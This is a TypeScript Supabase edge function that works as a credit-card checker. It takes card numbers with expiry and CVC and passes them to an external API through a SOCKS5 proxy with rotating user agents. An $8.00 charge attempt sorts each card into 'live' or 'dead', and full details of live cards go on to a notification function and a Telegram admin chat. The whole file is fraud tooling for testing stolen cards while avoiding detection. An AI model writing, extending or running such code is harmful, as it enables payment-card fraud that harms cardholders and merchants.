import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Send debug notification to admin Telegram
const sendAdminDebugNotification = async (cc: string, status: string, rawResponse: Record<string, unknown>) => {
  try {
    const maskedCard = cc.split('|')[0].slice(0, 6) + '******' + cc.split('|')[0].slice(-4);
    const prettyResponse = JSON.stringify(rawResponse, null, 2);
    
    const message = `🔍 *STRIPE CHARGE DEBUG - ${status.toUpperCase()}*

💳 Card: \`${maskedCard}\`
📊 Status: \`${status}\`
💵 Amount: \`$8.00\`

📋 *Raw API Response:*
\`\`\`json
${prettyResponse}
\`\`\``;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    console.log('[STRIPE-CHARGE] Sent admin debug notification for', status, 'status');
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to send admin notification:', error);
  }
};

// Notify charged card for live results
const notifyChargedCard = async (
  userId: string,
  cardDetails: string,
  status: string,
  responseMessage: string,
  amount: string,
  gateway: string,
  apiResponse?: string,
  screenshotUrl?: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  try {
    await fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
      },
      body: JSON.stringify({
        user_id: userId,
        card_details: cardDetails,
        status,
        response_message: responseMessage,
        amount,
        gateway,
        api_response: apiResponse,
        screenshot_url: screenshotUrl,
      }),
    });
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to notify charged card:', error);
  }
};

// Extract single key response message from API
const extractResponseMessage = (data: Record<string, unknown>): string => {
  if (data?.message && typeof data.message === 'string') {
    return data.message;
  }
  if (data?.status && typeof data.status === 'string') {
    return data.status;
  }
  if (data?.error && typeof data.error === 'string') {
    return data.error;
  }
  if (data?.result && typeof data.result === 'string') {
    return data.result;
  }
  for (const key of Object.keys(data)) {
    if (typeof data[key] === 'string' && data[key]) {
      return data[key] as string;
    }
  }
  return 'No response message';
};

// Determine status from API response based on full_response field
const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const rawResponse = JSON.stringify(data).toLowerCase();
  const message = String(data?.message || '').toLowerCase();
  const status = String(data?.status || '').toLowerCase();
  
  console.log('[STRIPE-CHARGE] Analyzing response - full_response:', data?.full_response, 'status:', status);
  
  // Primary logic: full_response = true means CHARGED (live), false means DECLINED (dead)
  if (typeof data?.full_response === 'boolean') {
    if (data.full_response === true) {
      console.log('[STRIPE-CHARGE] full_response=true - CHARGED (LIVE)');
      return "live";
    } else {
      console.log('[STRIPE-CHARGE] full_response=false - DECLINED (DEAD)');
      return "dead";
    }
  }
  
  // Fallback: check string versions of full_response
  const fullResponseStr = String(data?.full_response || '').toLowerCase();
  if (fullResponseStr === 'true') {
    console.log('[STRIPE-CHARGE] full_response="true" - CHARGED (LIVE)');
    return "live";
  }
  if (fullResponseStr === 'false') {
    console.log('[STRIPE-CHARGE] full_response="false" - DECLINED (DEAD)');
    return "dead";
  }
  
  // Check for success indicators
  if (
    status === 'success' ||
    rawResponse.includes('"success"') ||
    rawResponse.includes('charged') ||
    rawResponse.includes('approved') ||
    rawResponse.includes('successful')
  ) {
    console.log('[STRIPE-CHARGE] Detected success status - CHARGED (LIVE)');
    return "live";
  }
  
  // Check for decline indicators in message/response
  if (
    message.includes('card_declined') ||
    message.includes('declined') ||
    message.includes('insufficient') ||
    message.includes('expired') ||
    message.includes('invalid') ||
    message.includes('do_not_honor') ||
    message.includes('lost_card') ||
    message.includes('stolen_card') ||
    rawResponse.includes('card_declined') ||
    rawResponse.includes('declined') ||
    rawResponse.includes('do_not_honor')
  ) {
    console.log('[STRIPE-CHARGE] Detected decline in message - DECLINED (DEAD)');
    return "dead";
  }
  
  // Check for gateway/API errors (retry scenarios)
  if (
    rawResponse.includes('timeout') ||
    rawResponse.includes('connection') ||
    rawResponse.includes('network') ||
    rawResponse.includes('unavailable')
  ) {
    console.log('[STRIPE-CHARGE] Detected gateway error - UNKNOWN');
    return "unknown";
  }
  
  // If status is "error" but has decline indicators, mark as dead
  if (status === 'error' && (message.includes('card') || message.includes('decline'))) {
    console.log('[STRIPE-CHARGE] Error with card decline - DECLINED (DEAD)');
    return "dead";
  }
  
  console.log('[STRIPE-CHARGE] Unrecognized response - marking as UNKNOWN');
  return "unknown";
};

// Perform API check with retry logic
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 2;
  // New API format: http://web-production-7ad4f.up.railway.app/api?cc={cc}&proxy=138.197.124.55:9150&proxytype=sock5
  const timestamp = Date.now();
  const randomId = Math.random().toString(36).substring(2, 15);
  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5&_t=${timestamp}&_r=${randomId}`;
  
  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - API call:`, apiUrl);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-Request-ID': `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`,
      }
    });
    
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Raw API response:`, rawText);

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
    }

    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Parsed response:`, data);

    const computedStatus = getStatusFromResponse(data);
    const responseMessage = extractResponseMessage(data);
    
    // Build display message based on full_response
    let apiMessage = '';
    if (data?.full_response === true) {
      apiMessage = 'CHARGED - $8.00';
    } else if (data?.full_response === false) {
      apiMessage = 'DECLINED';
    } else {
      apiMessage = data?.message as string || responseMessage || 'No response message';
    }

    // Retry on UNKNOWN
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] UNKNOWN response on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 500));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }

    // Extract screenshot URL if available
    const screenshotUrl = data?.screenshot || data?.screenshot_url || data?.image || data?.image_url || null;

    return {
      computedStatus,
      responseMessage,
      apiStatus: computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN',
      apiMessage,
      apiTotal: '$8.00',
      rawResponse: JSON.stringify(data),
      screenshotUrl,
      fullResponse: data?.full_response,
    };
  } catch (error) {
    console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
    
    if (attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] Retrying after fetch error...`);
      await new Promise(resolve => setTimeout(resolve, 500));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }
    
    return { 
      apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
      computedStatus: "unknown",
      responseMessage: error instanceof Error ? error.message : "Unknown error"
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY for charge gateways
    const cardParts = cc.split('|');
    if (cardParts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNumber, mm, yy, cvc] = cardParts;
    
    // Validate CVC is present and valid (3-4 digits)
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[STRIPE-CHARGE] Checking card for user:', user.id);
    console.log('[STRIPE-CHARGE] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    // Send Telegram notification for LIVE cards
    const status = data.computedStatus as string;
    if (status === "live") {
      const responseMsg = `${data.apiStatus}: ${data.apiMessage} ($8.00)`;
      notifyChargedCard(
        user.id,
        cc,
        "CHARGED",
        responseMsg,
        "$8.00",
        "Yunchi Stripe Charge",
        data.rawResponse as string,
        data.screenshotUrl as string | undefined
      );
    }

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[STRIPE-CHARGE] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
